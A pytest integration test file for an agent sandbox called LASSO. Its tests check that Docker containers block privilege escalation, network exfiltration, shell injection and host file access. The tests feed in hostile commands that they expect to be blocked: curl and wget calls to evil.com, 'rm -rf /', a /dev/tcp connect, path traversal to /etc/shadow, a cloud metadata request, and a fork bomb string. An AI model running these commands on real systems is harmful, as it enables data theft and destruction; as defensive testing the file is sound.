"""Integration tests for container security — verifies REAL isolation enforcement.

These tests spin up actual Docker containers and attempt realistic attack
scenarios: privilege escalation, container escape, data exfiltration, and
policy bypass.  They verify that LASSO's defense-in-depth layers hold under
adversarial pressure.

Skip with: pytest -m "not integration"
Run only these: pytest -m integration tests/integration/test_container_security.py -v
"""

import json
import tempfile
import uuid
from pathlib import Path

import pytest

from lasso.backends.base import ContainerConfig, ContainerState
from lasso.backends.docker_backend import DockerBackend
from lasso.config.schema import (
    AuditConfig,
    CommandConfig,
    CommandMode,
    FilesystemConfig,
    NetworkConfig,
    NetworkMode,
    ProfileMode,
    ResourceConfig,
    SandboxProfile,
)
from lasso.core.audit_verify import verify_audit_log
from lasso.core.sandbox import Sandbox, SandboxRegistry

# Mark all tests in this module as integration
pytestmark = pytest.mark.integration


# ---------------------------------------------------------------------------
# Shared fixtures
# ---------------------------------------------------------------------------

@pytest.fixture(scope="module")
def docker_backend():
    """Create a Docker backend, skip the entire module if Docker is unavailable."""
    backend = DockerBackend()
    if not backend.is_available():
        pytest.skip("Docker daemon not available")
    return backend


@pytest.fixture
def hardened_container(docker_backend):
    """Spin up a fully hardened container matching LASSO's production defaults.

    - cap_drop ALL
    - read-only rootfs
    - non-root user (1000:1000)
    - no-new-privileges
    - network_mode=none
    - memory limit 128m
    - pids limit 50
    - tmpfs at /tmp
    """
    config = ContainerConfig(
        image="alpine:latest",
        name=f"lasso-security-test-{uuid.uuid4().hex[:8]}",
        working_dir="/workspace",
        network_mode="none",
        mem_limit="128m",
        pids_limit=50,
        cap_drop=["ALL"],
        cap_add=[],
        read_only_root=True,
        tmpfs_mounts={
            "/tmp": "size=16m,mode=1777",
            "/workspace": "size=16m,mode=1777",
        },
        environment={"LASSO_TEST": "true"},
        security_opt=["no-new-privileges"],
        user="1000:1000",
    )

    container_id = docker_backend.create(config)
    docker_backend.start(container_id)
    yield container_id
    docker_backend.stop(container_id, timeout=5)
    docker_backend.remove(container_id, force=True)


@pytest.fixture
def workspace_dir():
    """Create a temporary workspace directory for sandbox tests."""
    with tempfile.TemporaryDirectory(prefix="lasso-test-") as tmpdir:
        # Write a sentinel file to verify mount isolation
        sentinel = Path(tmpdir) / "sentinel.txt"
        sentinel.write_text("workspace-marker")
        yield tmpdir


@pytest.fixture
def audit_dir():
    """Create a temporary directory for audit logs."""
    with tempfile.TemporaryDirectory(prefix="lasso-audit-") as tmpdir:
        yield tmpdir


@pytest.fixture
def sandbox_registry(docker_backend, workspace_dir, audit_dir):
    """Create a SandboxRegistry with a real DockerBackend.

    Uses a temporary state directory so tests don't pollute ~/.lasso.
    """
    with tempfile.TemporaryDirectory(prefix="lasso-state-") as state_dir:
        registry = SandboxRegistry(
            backend=docker_backend,
            state_dir=state_dir,
        )
        yield registry
        # Cleanup: stop all sandboxes created during the test
        registry.stop_all()


def _make_profile(
    working_dir: str,
    audit_dir: str,
    name: str = "test-security",
    network_mode: NetworkMode = NetworkMode.NONE,
    sign_entries: bool = True,
    mode: ProfileMode = ProfileMode.AUTONOMOUS,
) -> SandboxProfile:
    """Build a test profile with sensible security defaults."""
    return SandboxProfile(
        name=name,
        description="Integration test security profile",
        mode=mode,
        filesystem=FilesystemConfig(
            working_dir=working_dir,
            hidden_paths=["/etc/shadow", "/etc/gshadow", "/root"],
        ),
        commands=CommandConfig(
            mode=CommandMode.WHITELIST,
            whitelist=[
                "ls", "cat", "head", "tail", "grep", "echo", "test",
                "wc", "id", "whoami", "sh", "env", "printenv",
                "ping", "touch", "mkdir",
            ],
            allow_shell_operators=True,
        ),
        network=NetworkConfig(mode=network_mode),
        resources=ResourceConfig(max_memory_mb=128, max_cpu_percent=25, max_pids=50),
        audit=AuditConfig(
            enabled=True,
            log_dir=audit_dir,
            sign_entries=sign_entries,
            include_command_output=True,
        ),
    )


# ===========================================================================
# TestContainerHardening
# ===========================================================================

class TestContainerHardening:
    """Verify that security hardening options are genuinely enforced by the
    container runtime, not just declared in config.
    """

    def test_cap_drop_all_blocks_raw_socket(self, docker_backend, hardened_container):
        """With CAP_DROP ALL, creating a raw socket should fail.

        Raw sockets require CAP_NET_RAW.  An agent that can open raw sockets
        can craft ARP spoofs, ICMP redirects, and other network-level attacks.
        """
        result = docker_backend.exec(hardened_container, [
            "sh", "-c",
            # Attempt to use ping which requires CAP_NET_RAW
            "ping -c1 -W1 127.0.0.1 2>&1; echo EXIT=$?"
        ])
        # ping should fail because CAP_NET_RAW is dropped
        # On Alpine, ping without cap_net_raw gives "Operation not permitted"
        output = result.stdout + result.stderr
        assert (
            "Operation not permitted" in output
            or "not permitted" in output.lower()
            or "EXIT=1" in result.stdout
            or "EXIT=2" in result.stdout
            or result.exit_code != 0
        ), f"Expected capability denial, got: {output}"

    def test_read_only_rootfs_blocks_writes(self, docker_backend, hardened_container):
        """Read-only root filesystem must prevent writes everywhere except
        tmpfs mounts.  An agent that can write to / can replace system binaries,
        inject libraries, or modify /etc/resolv.conf.
        """
        # Try writing to several system locations
        targets = ["/testfile", "/etc/evil", "/bin/evil", "/var/evil"]
        for target in targets:
            result = docker_backend.exec(hardened_container, [
                "sh", "-c", f"touch {target} 2>&1 || echo READONLY"
            ])
            output = result.stdout + result.stderr
            assert (
                "READONLY" in output
                or "Read-only" in output
                or "Permission denied" in output
                or result.exit_code != 0
            ), f"Write to {target} should have been blocked: {output}"

    def test_non_root_user_enforced(self, docker_backend, hardened_container):
        """Container runs as uid=1000 (not root).  If the container runs as
        root, a compromised process can modify cgroup limits, install packages,
        and disable security controls.
        """
        result = docker_backend.exec(hardened_container, ["id"])
        assert result.exit_code == 0
        # Verify uid=1000, NOT uid=0
        assert "uid=1000" in result.stdout, f"Expected uid=1000, got: {result.stdout}"
        assert "uid=0" not in result.stdout, "Container is running as root!"

    def test_no_new_privileges_applied(self, docker_backend, hardened_container):
        """no-new-privileges prevents setuid/setgid binaries from gaining
        elevated privileges.  Without this, an agent could use a setuid
        binary to escalate to root even inside the container.
        """
        # Inspect the container to verify the security option
        client = docker_backend._get_client()
        data = client.api.inspect_container(hardened_container)
        security_opts = data.get("HostConfig", {}).get("SecurityOpt", [])
        assert "no-new-privileges" in security_opts, (
            f"no-new-privileges not in SecurityOpt: {security_opts}"
        )

        # Also attempt to use su (which relies on setuid) -- should fail
        result = docker_backend.exec(hardened_container, [
            "sh", "-c", "su -c 'id' root 2>&1 || echo DENIED"
        ])
        output = result.stdout + result.stderr
        # su should fail (either not found, or permission denied)
        assert (
            "DENIED" in output
            or "not found" in output.lower()
            or "Permission denied" in output
            or "must be run from a terminal" in output
            or "Authentication failure" in output
            or result.exit_code != 0
        ), f"su should have been blocked: {output}"

    def test_memory_limit_kills_excessive_allocation(self, docker_backend, hardened_container):
        """When a process exceeds the memory limit, the OOM killer should
        terminate it.  Without memory limits, a malicious agent can exhaust
        host memory and cause a denial-of-service.

        Container has 128m limit.  We allocate 200m.
        """
        result = docker_backend.exec(hardened_container, [
            "sh", "-c",
            # Allocate ~200MB via dd to /dev/null through a pipe to stress memory
            # Use head -c to create a large in-memory buffer
            "head -c 200000000 /dev/urandom > /dev/null 2>&1; echo SURVIVED"
        ], timeout=30)

        # The container itself should still be running (OOM kills the process,
        # not necessarily the container, depending on oom policy)
        info = docker_backend.inspect(hardened_container)
        # We accept either: process was killed (exit_code != 0) or
        # container is still functional
        assert (
            info.state == ContainerState.RUNNING
            or result.exit_code != 0
        )

    def test_pids_limit_blocks_fork_bomb(self, docker_backend, hardened_container):
        """PID limit (50) prevents a fork bomb from consuming all host PIDs.

        Without PID limits, a single malicious command like :(){ :|:& };:
        can render the entire host unresponsive.
        """
        result = docker_backend.exec(hardened_container, [
            "sh", "-c",
            # Try to create 100 background processes (limit is 50)
            "for i in $(seq 1 100); do sleep 60 & done 2>&1; echo done"
        ], timeout=15)

        output = result.stdout + result.stderr
        # Should see resource errors (fork: Resource temporarily unavailable)
        # OR the command may partially succeed but the container is still alive
        info = docker_backend.inspect(hardened_container)
        assert info.state == ContainerState.RUNNING, (
            "Container died from fork bomb -- PID limit may not be enforced"
        )

        # Verify we cannot actually have 100 processes running
        ps_result = docker_backend.exec(hardened_container, [
            "sh", "-c", "ls /proc/*/status 2>/dev/null | wc -l"
        ])
        if ps_result.exit_code == 0:
            proc_count = int(ps_result.stdout.strip() or "0")
            assert proc_count < 100, (
                f"Too many processes ({proc_count}), PID limit may not be enforced"
            )


# ===========================================================================
# TestNetworkIsolation
# ===========================================================================

class TestNetworkIsolation:
    """Verify that network isolation prevents data exfiltration and
    unauthorized communication.
    """

    def test_network_none_blocks_outbound(self, docker_backend, hardened_container):
        """network_mode=none should block ALL outbound network traffic.

        This is the primary defense against data exfiltration.  An agent with
        network access can send stolen code, API keys, or PII to an external
        server.
        """
        # Try to reach external hosts
        result = docker_backend.exec(hardened_container, [
            "sh", "-c",
            "ping -c1 -W2 8.8.8.8 2>&1; echo EXIT=$?"
        ], timeout=10)
        output = result.stdout + result.stderr
        assert (
            "EXIT=1" in result.stdout
            or "EXIT=2" in result.stdout
            or "Network unreachable" in output
            or "not permitted" in output.lower()
            or result.exit_code != 0
        ), f"Outbound traffic should be blocked, got: {output}"

    def test_network_none_allows_loopback(self, docker_backend, hardened_container):
        """Even with network_mode=none, loopback (127.0.0.1) should work.

        Processes inside the container need loopback for inter-process
        communication (e.g. pytest running a local test server).
        """
        # echo via sh to loopback -- basic connectivity test
        result = docker_backend.exec(hardened_container, [
            "sh", "-c",
            "echo test > /tmp/lo_test && cat /tmp/lo_test"
        ])
        assert result.exit_code == 0
        assert "test" in result.stdout

    def test_dns_unavailable_in_none_mode(self, docker_backend, hardened_container):
        """With network_mode=none, DNS resolution should fail.

        If DNS works, an agent could use DNS tunneling to exfiltrate data
        even without direct TCP/IP connectivity.
        """
        # Try to resolve a domain
        result = docker_backend.exec(hardened_container, [
            "sh", "-c",
            "nslookup google.com 2>&1 || echo DNS_BLOCKED"
        ], timeout=10)
        output = result.stdout + result.stderr
        # nslookup may not exist on alpine, but any DNS attempt should fail
        assert (
            "DNS_BLOCKED" in output
            or "not found" in output.lower()
            or "can't resolve" in output.lower()
            or "SERVFAIL" in output
            or "connection timed out" in output.lower()
            or "no servers could be reached" in output.lower()
            or result.exit_code != 0
        ), f"DNS should be blocked in none mode, got: {output}"

    def test_cloud_metadata_endpoint_unreachable(self, docker_backend, hardened_container):
        """The cloud metadata endpoint (169.254.169.254) must be unreachable.

        On AWS/GCP/Azure, this endpoint exposes instance credentials, IAM
        roles, and other secrets.  A common SSRF attack vector.
        """
        result = docker_backend.exec(hardened_container, [
            "sh", "-c",
            "wget -q -O- --timeout=2 http://169.254.169.254/latest/meta-data/ 2>&1 || echo BLOCKED"
        ], timeout=10)
        output = result.stdout + result.stderr
        assert (
            "BLOCKED" in output
            or "Network unreachable" in output
            or "Connection refused" in output
            or "not permitted" in output.lower()
            or "timed out" in output.lower()
            or result.exit_code != 0
        ), f"Metadata endpoint should be blocked, got: {output}"

    def test_no_network_interfaces_except_loopback(self, docker_backend, hardened_container):
        """In none mode, only the loopback interface (lo) should exist.

        If eth0 or other interfaces are present, traffic may bypass
        iptables rules through raw sockets or alternative routing.
        """
        result = docker_backend.exec(hardened_container, [
            "sh", "-c",
            "ls /sys/class/net/ 2>/dev/null || ip link show 2>/dev/null || echo lo"
        ])
        output = result.stdout.strip()
        # Only 'lo' should be listed
        interfaces = output.split()
        for iface in interfaces:
            assert iface == "lo", (
                f"Unexpected network interface '{iface}' found. "
                f"Only loopback expected in none mode. All interfaces: {interfaces}"
            )

    def test_cannot_create_network_socket(self, docker_backend, hardened_container):
        """Attempting to create an outbound TCP connection should fail.

        Even without ping (ICMP), an agent might try direct TCP connects
        to exfiltrate data.
        """
        result = docker_backend.exec(hardened_container, [
            "sh", "-c",
            # Try to open a TCP connection using shell built-in /dev/tcp
            # (ash on Alpine may not support this, but the attempt itself
            # should fail due to network isolation either way)
            "(echo test > /dev/tcp/93.184.216.34/80) 2>&1 || echo TCP_BLOCKED"
        ], timeout=10)
        output = result.stdout + result.stderr
        assert (
            "TCP_BLOCKED" in output
            or "can't create" in output.lower()
            or "Network unreachable" in output
            or "no such file" in output.lower()
            or result.exit_code != 0
        ), f"TCP connection should be blocked, got: {output}"


# ===========================================================================
# TestCommandGateWithContainer
# ===========================================================================

class TestCommandGateWithContainer:
    """End-to-end tests verifying the full LASSO stack: command gate
    validates commands BEFORE they reach the container, and the container
    provides defense-in-depth enforcement.
    """

    def test_allowed_command_succeeds(
        self, docker_backend, workspace_dir, audit_dir
    ):
        """A whitelisted command should pass through the gate and execute
        successfully inside the container.
        """
        profile = _make_profile(workspace_dir, audit_dir)
        sandbox = Sandbox(profile, backend=docker_backend)
        try:
            sandbox.start()
            result = sandbox.exec("echo hello-from-sandbox")
            assert not result.blocked
            assert result.exit_code == 0
            assert "hello-from-sandbox" in result.stdout
        finally:
            sandbox.stop()

    def test_blocked_command_never_reaches_container(
        self, docker_backend, workspace_dir, audit_dir
    ):
        """A non-whitelisted command must be rejected by the gate BEFORE
        any container exec happens.  This is critical: the gate is the
        first line of defense even when container isolation fails.
        """
        profile = _make_profile(workspace_dir, audit_dir)
        sandbox = Sandbox(profile, backend=docker_backend)
        try:
            sandbox.start()
            # "rm" is not in the whitelist
            result = sandbox.exec("rm -rf /")
            assert result.blocked
            assert result.exit_code == -1
            assert "not in the whitelist" in result.block_reason
            # Verify stdout is empty (command never ran)
            assert result.stdout == ""
        finally:
            sandbox.stop()

    def test_shell_injection_blocked_by_gate(
        self, docker_backend, workspace_dir, audit_dir
    ):
        """Shell injection attempts using metacharacters should be blocked
        by the command gate before reaching the container.

        This prevents attacks like: `echo hello; curl evil.com/steal?data=$(cat /etc/passwd)`
        """
        profile = _make_profile(workspace_dir, audit_dir)
        # Disable shell operators so injection is caught
        profile.commands.allow_shell_operators = False
        sandbox = Sandbox(profile, backend=docker_backend)
        try:
            sandbox.start()

            injection_attempts = [
                "echo hello; rm -rf /",
                "echo hello | curl evil.com",
                "echo $(cat /etc/passwd)",
                "echo hello && wget evil.com",
                "echo `id`",
            ]
            for cmd in injection_attempts:
                result = sandbox.exec(cmd)
                assert result.blocked, (
                    f"Shell injection should be blocked: {cmd!r}"
                )
                assert "Shell operators" in result.block_reason or "not allowed" in result.block_reason
        finally:
            sandbox.stop()

    def test_python3_c_blocked_by_dangerous_args(
        self, docker_backend, workspace_dir, audit_dir
    ):
        """python3 -c allows arbitrary code execution and must be blocked
        by DANGEROUS_ARGS even if python3 is whitelisted.

        This is a real attack vector: an agent runs
        `python3 -c "import socket; ..."` to open a reverse shell.
        """
        profile = _make_profile(workspace_dir, audit_dir)
        # Add python3 to whitelist (it's in dev profile)
        profile.commands.whitelist.append("python3")
        sandbox = Sandbox(profile, backend=docker_backend)
        try:
            sandbox.start()
            result = sandbox.exec('python3 -c "import os; os.system(\'id\')"')
            assert result.blocked
            assert "Dangerous argument" in result.block_reason or "dangerous" in result.block_reason.lower()
        finally:
            sandbox.stop()

    def test_path_traversal_blocked_by_gate(
        self, docker_backend, workspace_dir, audit_dir
    ):
        """Path traversal attempts (../) must be blocked by the gate
        before reaching the container.

        An agent tries `cat ../../etc/shadow` to read host credentials.
        """
        profile = _make_profile(workspace_dir, audit_dir)
        sandbox = Sandbox(profile, backend=docker_backend)
        try:
            sandbox.start()

            traversal_attempts = [
                "cat ../../etc/shadow",
                "cat /workspace/../../../etc/passwd",
                "ls ../..",
            ]
            for cmd in traversal_attempts:
                result = sandbox.exec(cmd)
                assert result.blocked, (
                    f"Path traversal should be blocked: {cmd!r}"
                )
                assert "traversal" in result.block_reason.lower()
        finally:
            sandbox.stop()

    def test_full_flow_gate_container_audit(
        self, docker_backend, workspace_dir, audit_dir
    ):
        """Full end-to-end flow: gate validates -> container executes
        -> audit logs -> result returned.

        Verifies that all three layers work together in concert.
        """
        profile = _make_profile(workspace_dir, audit_dir)
        sandbox = Sandbox(profile, backend=docker_backend)
        try:
            sandbox.start()

            # Execute a valid command
            result = sandbox.exec("echo integration-test-marker")
            assert not result.blocked
            assert result.exit_code == 0
            assert "integration-test-marker" in result.stdout
            assert result.duration_ms >= 0

            # Execute a blocked command
            blocked_result = sandbox.exec("rm -rf /critical")
            assert blocked_result.blocked

            # Verify audit trail was created
            assert sandbox.audit.log_file is not None
            assert sandbox.audit.log_file.exists()

            # Read audit entries
            entries = []
            with open(sandbox.audit.log_file) as f:
                for line in f:
                    line = line.strip()
                    if line:
                        entries.append(json.loads(line))

            # Find command events
            command_events = [e for e in entries if e.get("type") == "command"]
            assert len(command_events) >= 2, (
                f"Expected at least 2 command events, got {len(command_events)}"
            )

            # Verify the successful command event
            success_events = [
                e for e in command_events if e.get("outcome") == "success"
            ]
            assert len(success_events) >= 1

            # Verify the blocked command event
            blocked_events = [
                e for e in command_events if e.get("outcome") == "blocked"
            ]
            assert len(blocked_events) >= 1

            # All events should have the correct sandbox_id
            for entry in entries:
                assert entry.get("sandbox_id") == sandbox.id
        finally:
            sandbox.stop()


# ===========================================================================
# TestFilesystemIsolation
# ===========================================================================

class TestFilesystemIsolation:
    """Verify that the container filesystem provides genuine isolation
    from the host.
    """

    def test_workspace_mounted_at_workspace(self, docker_backend, workspace_dir):
        """The working directory should be mounted at /workspace inside
        the container.
        """
        config = ContainerConfig(
            image="alpine:latest",
            name=f"lasso-fs-test-{uuid.uuid4().hex[:8]}",
            working_dir="/workspace",
            network_mode="none",
            mem_limit="128m",
            pids_limit=50,
            cap_drop=["ALL"],
            read_only_root=True,
            tmpfs_mounts={"/tmp": "size=16m,mode=1777"},
            bind_mounts=[{
                "source": workspace_dir,
                "target": "/workspace",
                "mode": "rw",
            }],
            user="1000:1000",
        )
        cid = docker_backend.create(config)
        try:
            docker_backend.start(cid)
            # The sentinel file written by the fixture should be visible
            result = docker_backend.exec(cid, ["cat", "/workspace/sentinel.txt"])
            assert result.exit_code == 0
            assert "workspace-marker" in result.stdout
        finally:
            docker_backend.stop(cid, timeout=5)
            docker_backend.remove(cid, force=True)

    def test_host_files_outside_workspace_not_accessible(
        self, docker_backend, hardened_container
    ):
        """Files from the host that were NOT bind-mounted should be
        invisible inside the container.

        This prevents an agent from reading ~/.ssh/id_rsa, ~/.aws/credentials,
        /etc/shadow, or any other sensitive host file.
        """
        # Try to read host-specific files that should not be present
        sensitive_paths = [
            "/home/jb/.ssh/id_rsa",
            "/home/jb/.bash_history",
            "/root/.bashrc",
            "/etc/hostname",  # container has its own
        ]
        for path in sensitive_paths:
            result = docker_backend.exec(hardened_container, [
                "sh", "-c", f"cat {path} 2>&1 || echo NOT_FOUND"
            ])
            output = result.stdout + result.stderr
            # The file should either not exist or not contain host data
            assert (
                "NOT_FOUND" in output
                or "No such file" in output
                or "Permission denied" in output
                or result.exit_code != 0
            ), f"Host file {path} should not be accessible: {output}"

    def test_tmp_is_writable_tmpfs(self, docker_backend, hardened_container):
        """/tmp should be a writable tmpfs mount even when rootfs is read-only.

        Agents need somewhere to write temp files for their work.
        """
        result = docker_backend.exec(hardened_container, [
            "sh", "-c",
            "echo tmpfs-test > /tmp/test.txt && cat /tmp/test.txt"
        ])
        assert result.exit_code == 0
        assert "tmpfs-test" in result.stdout

        # Verify it's actually tmpfs (not a host directory)
        mount_result = docker_backend.exec(hardened_container, [
            "sh", "-c", "mount 2>/dev/null | grep '/tmp' || echo 'mount-check'"
        ])
        # On some containers, mount may not be available, but /tmp being
        # writable while / is read-only proves it's a separate mount
        assert result.exit_code == 0

    def test_hidden_paths_not_accessible(self, docker_backend, hardened_container):
        """Paths configured as hidden_paths should not be readable.

        The container rootfs shouldn't have /etc/shadow contents from the host,
        and even if alpine has its own, a non-root user can't read it.
        """
        result = docker_backend.exec(hardened_container, [
            "sh", "-c", "cat /etc/shadow 2>&1 || echo HIDDEN"
        ])
        output = result.stdout + result.stderr
        assert (
            "HIDDEN" in output
            or "Permission denied" in output
            or result.exit_code != 0
        ), f"/etc/shadow should not be readable: {output}"

        # /root should not be accessible to uid=1000
        result = docker_backend.exec(hardened_container, [
            "sh", "-c", "ls /root/ 2>&1 || echo HIDDEN"
        ])
        output = result.stdout + result.stderr
        assert (
            "HIDDEN" in output
            or "Permission denied" in output
            or result.exit_code != 0
        ), f"/root should not be accessible: {output}"


# ===========================================================================
# TestAuditInContainer
# ===========================================================================

class TestAuditInContainer:
    """Verify that the audit subsystem correctly records all container
    activity with tamper-evident signatures.
    """

    def test_command_execution_creates_audit_entry(
        self, docker_backend, workspace_dir, audit_dir
    ):
        """Every command executed through the Sandbox must produce an
        audit entry.
        """
        profile = _make_profile(workspace_dir, audit_dir)
        sandbox = Sandbox(profile, backend=docker_backend)
        try:
            sandbox.start()
            sandbox.exec("echo audit-test")
            sandbox.stop()

            assert sandbox.audit.log_file is not None
            assert sandbox.audit.log_file.exists()

            entries = _read_audit_entries(sandbox.audit.log_file)
            command_entries = [
                e for e in entries
                if e.get("type") == "command" and e.get("action") == "echo"
            ]
            assert len(command_entries) >= 1, (
                f"Expected audit entry for 'echo', got: "
                f"{[e.get('action') for e in entries if e.get('type') == 'command']}"
            )
        finally:
            if sandbox.state.value != "stopped":
                sandbox.stop()

    def test_blocked_command_creates_audit_entry(
        self, docker_backend, workspace_dir, audit_dir
    ):
        """Blocked commands must be logged with outcome='blocked'."""
        profile = _make_profile(workspace_dir, audit_dir)
        sandbox = Sandbox(profile, backend=docker_backend)
        try:
            sandbox.start()
            sandbox.exec("rm -rf /")  # not whitelisted
            sandbox.stop()

            entries = _read_audit_entries(sandbox.audit.log_file)
            blocked_entries = [
                e for e in entries
                if e.get("type") == "command" and e.get("outcome") == "blocked"
            ]
            assert len(blocked_entries) >= 1
            # Verify the reason is captured
            detail = blocked_entries[0].get("detail", {})
            assert "reason" in detail
        finally:
            if sandbox.state.value != "stopped":
                sandbox.stop()

    def test_audit_entry_has_correct_sandbox_id(
        self, docker_backend, workspace_dir, audit_dir
    ):
        """Every audit entry must reference the correct sandbox_id for
        multi-sandbox correlation.
        """
        profile = _make_profile(workspace_dir, audit_dir)
        sandbox = Sandbox(profile, backend=docker_backend)
        try:
            sandbox.start()
            sandbox.exec("echo id-check")
            sandbox.stop()

            entries = _read_audit_entries(sandbox.audit.log_file)
            for entry in entries:
                assert entry.get("sandbox_id") == sandbox.id, (
                    f"Entry sandbox_id {entry.get('sandbox_id')} != {sandbox.id}"
                )
        finally:
            if sandbox.state.value != "stopped":
                sandbox.stop()

    def test_audit_log_has_valid_hmac_signature(
        self, docker_backend, workspace_dir, audit_dir
    ):
        """The audit log must pass HMAC chain verification.

        This proves no entries were added, removed, or reordered after
        the fact.  Critical for compliance (DORA, ISO 27001).
        """
        profile = _make_profile(workspace_dir, audit_dir, sign_entries=True)
        sandbox = Sandbox(profile, backend=docker_backend)
        try:
            sandbox.start()

            # Generate several audit entries
            sandbox.exec("echo entry-1")
            sandbox.exec("echo entry-2")
            sandbox.exec("rm blocked-command")  # will be blocked
            sandbox.exec("echo entry-3")

            sandbox.stop()

            # Verify the HMAC chain
            assert sandbox.audit.log_file is not None
            result = verify_audit_log(str(sandbox.audit.log_file))
            assert result.valid, (
                f"Audit log HMAC verification failed: {result.errors}"
            )
            assert result.total_entries > 0
            assert result.verified_entries == result.total_entries
            assert result.first_break_at is None
        finally:
            if sandbox.state.value != "stopped":
                sandbox.stop()


# ===========================================================================
# TestContainerLifecycle
# ===========================================================================

class TestContainerLifecycle:
    """Verify that sandbox lifecycle operations are clean and correct."""

    def test_create_start_exec_stop_lifecycle(
        self, docker_backend, workspace_dir, audit_dir
    ):
        """Full lifecycle: create -> start -> exec -> stop."""
        profile = _make_profile(workspace_dir, audit_dir)
        sandbox = Sandbox(profile, backend=docker_backend)

        # Pre-start state
        assert sandbox.state.value == "created"

        # Start
        sandbox.start()
        assert sandbox.state.value == "running"

        # Exec
        result = sandbox.exec("echo lifecycle-test")
        assert not result.blocked
        assert result.exit_code == 0
        assert "lifecycle-test" in result.stdout

        # Stop
        sandbox.stop()
        assert sandbox.state.value == "stopped"

    def test_stop_cleans_up_container(
        self, docker_backend, workspace_dir, audit_dir
    ):
        """After stop(), the container should be removed from Docker."""
        profile = _make_profile(workspace_dir, audit_dir)
        sandbox = Sandbox(profile, backend=docker_backend)
        sandbox.start()

        container_id = sandbox._container_id
        assert container_id is not None

        # Verify container exists
        info = docker_backend.inspect(container_id)
        assert info.state == ContainerState.RUNNING

        # Stop and cleanup
        sandbox.stop()

        # Container should be removed (inspect should fail)
        from docker.errors import NotFound
        try:
            docker_backend.inspect(container_id)
            # If inspect succeeds, container still exists -- fail
            pytest.fail("Container should have been removed after stop()")
        except (NotFound, Exception):
            pass  # Expected: container is gone

    def test_concurrent_sandboxes_are_isolated(
        self, docker_backend, workspace_dir, audit_dir
    ):
        """Two sandboxes running concurrently must be fully isolated from
        each other -- separate containers, separate filesystems, separate
        network namespaces.
        """
        with tempfile.TemporaryDirectory(prefix="lasso-ws1-") as ws1, \
             tempfile.TemporaryDirectory(prefix="lasso-ws2-") as ws2:

            profile1 = _make_profile(ws1, audit_dir, name="sandbox-a")
            profile2 = _make_profile(ws2, audit_dir, name="sandbox-b")

            sb1 = Sandbox(profile1, backend=docker_backend)
            sb2 = Sandbox(profile2, backend=docker_backend)

            try:
                sb1.start()
                sb2.start()

                # Write a file in sandbox1
                sb1.exec("sh -c 'echo secret-from-sb1 > /tmp/secret.txt'")

                # sandbox2 should NOT be able to see it
                result = sb2.exec("sh -c 'cat /tmp/secret.txt 2>&1 || echo NOT_FOUND'")
                assert (
                    "NOT_FOUND" in result.stdout
                    or "No such file" in result.stdout
                ), "Sandbox 2 can see files from Sandbox 1 -- isolation broken!"

                # Verify different container IDs
                assert sb1._container_id != sb2._container_id

                # Verify different sandbox IDs
                assert sb1.id != sb2.id
            finally:
                sb1.stop()
                sb2.stop()

    def test_registry_tracks_sandbox_state(
        self, sandbox_registry, workspace_dir, audit_dir
    ):
        """SandboxRegistry should correctly track create/start/stop state
        and persist it across operations.
        """
        profile = _make_profile(workspace_dir, audit_dir, name="registry-test")

        # Create via registry
        sandbox = sandbox_registry.create(profile)
        assert sandbox_registry.get(sandbox.id) is not None
        assert len(sandbox_registry) == 1

        # Start
        sandbox.start()
        assert sandbox.state.value == "running"

        # List
        all_sandboxes = sandbox_registry.list_all()
        assert len(all_sandboxes) >= 1
        found = [s for s in all_sandboxes if s["id"] == sandbox.id]
        assert len(found) == 1
        assert found[0]["state"] == "running"

        # Stop via registry
        sandbox_registry.stop(sandbox.id)
        assert sandbox.state.value == "stopped"

        # State store should have recorded the stop
        assert sandbox_registry.store is not None


# ===========================================================================
# Helpers
# ===========================================================================

def _read_audit_entries(log_file: Path) -> list[dict]:
    """Read all JSONL entries from an audit log file."""
    entries = []
    with open(log_file) as f:
        for line in f:
            line = line.strip()
            if line:
                entries.append(json.loads(line))
    return entries
